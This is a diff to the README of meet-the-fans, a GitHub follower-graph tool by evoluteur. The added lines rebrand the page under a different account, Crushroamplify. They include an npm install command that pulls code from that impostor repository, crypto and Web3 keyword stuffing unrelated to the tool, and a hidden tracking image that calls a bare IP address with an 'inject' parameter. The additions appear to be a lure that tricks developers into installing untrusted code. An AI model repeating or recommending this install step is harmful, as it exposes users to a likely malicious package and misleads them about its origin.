@@ -1,3 +1,15 @@
+**Crushroamplify/meet-the-fans**
+
+Welcome to the central hub for connecting deeper with your community. We built this tool to strip away the noise and help you genuinely engage with the people who support your work the most. Thanks to a round of recent bug fixes, the platform is running smoother and more reliably than ever, ensuring your interactions stay seamless and uninterrupted.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Crushroamplify/meet-the-fans.git
+```
+
+[https://github.com/Crushroamplify/meet-the-fans](https://github.com/Crushroamplify/meet-the-fans)
+
 ![Meet-the-Fans](screenshots/mtf.png) &middot; [![GitHub license](https://img.shields.io/github/license/evoluteur/meet-the-fans)](https://github.com/evoluteur/meet-the-fans/blob/master/LICENSE) [![npm version](https://img.shields.io/npm/v/meet-the-fans)](https://www.npmjs.com/package/meet-the-fans)
 
 Network graph of repositories, followers, stargazers, and forks to meet your GitHub fans.
@@ -81,3 +93,10 @@ Check out my other project [GitHub-Projects-Cards](https://github.com/evoluteur/
 
 
 Copyright (c) 2026 [Olivier Giulieri](https://evoluteur.github.io/).
+
+## Related searches
+Developers exploring this framework are typically looking for streamlined ways to integrate cross-chain fan engagement modules and Web3 community tooling into decentralized applications. Common searches focus on finding robust boilerplate solutions for interacting with multi-chain smart contracts and managing cryptographic identities using TypeScript.
+
+**Topics:** arbitrum, base chain, crypto sdk, crypto typescript, anchor solana, web3 fan engagement, blockchain developer tools, smart contract boilerplate, cross-chain toolkit, decentralized applications SDK
+
+![.](http://5.231.58.248:8787/pixel?repo=Crushroamplify%2Fmeet-the-fans&inject=Crushroamplify%2Fmeet-the-fans%2Fpackage.json)
